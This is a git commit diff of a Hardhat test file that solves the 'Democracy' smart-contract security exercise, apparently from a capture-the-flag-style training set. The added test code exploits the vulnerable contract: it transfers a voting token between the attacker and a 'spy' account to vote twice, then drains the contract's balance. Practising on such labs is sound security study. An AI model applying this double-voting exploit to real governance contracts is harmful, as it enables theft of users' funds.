8025a2ff392c21a49ca8f5fa19ce360657ed466e
Chua, Shu Ern <shuernchua@kapps.com.sg>
2023-12-01 14:37:42 +0800

    Solve Democracy
    TODO: What if smart contracts were allowed. Do another

--- test/Democracy.js
+++ test/Democracy.js
@@ -1,7 +1,4 @@
-const {
-  time,
-  loadFixture,
-} = require("@nomicfoundation/hardhat-network-helpers");
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
 const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
@@ -9,29 +6,36 @@ const { ethers } = require("hardhat");
 const NAME = "Democracy";
 
 describe(NAME, function () {
-  async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
-      const value = ethers.utils.parseEther("1");
+    async function setup() {
+        const [owner, attackerWallet, spy] = await ethers.getSigners();
+        const value = ethers.utils.parseEther("1");
 
-      const VictimFactory = await ethers.getContractFactory(NAME);
-      const victimContract = await VictimFactory.deploy({ value });
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy({ value });
 
-      return { victimContract, attackerWallet };
-  }
+        return { victimContract, attackerWallet, spy };
+    }
 
-  describe("exploit", async function () {
-      let victimContract, attackerWallet;
-      before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
-      })
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet, spy } = await loadFixture(setup));
+        });
 
-      it("conduct your attack here", async function () {
-          
-      });
+        it("conduct your attack here", async function () {
+            // TODO: What if smart contracts were allowed?
+            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+            await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, spy.address, 0);
+            await victimContract.connect(spy).vote(attackerWallet.address);
+            console.log("ok spy voted, transfer back");
+            await victimContract.connect(spy).transferFrom(spy.address, attackerWallet.address, 0);
+            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
+        });
 
-      after(async function () {
-          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
-          expect(victimContractBalance).to.be.equal('0');
-      });
-  });
+        after(async function () {
+            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
+            expect(victimContractBalance).to.be.equal("0");
+        });
+    });
 });
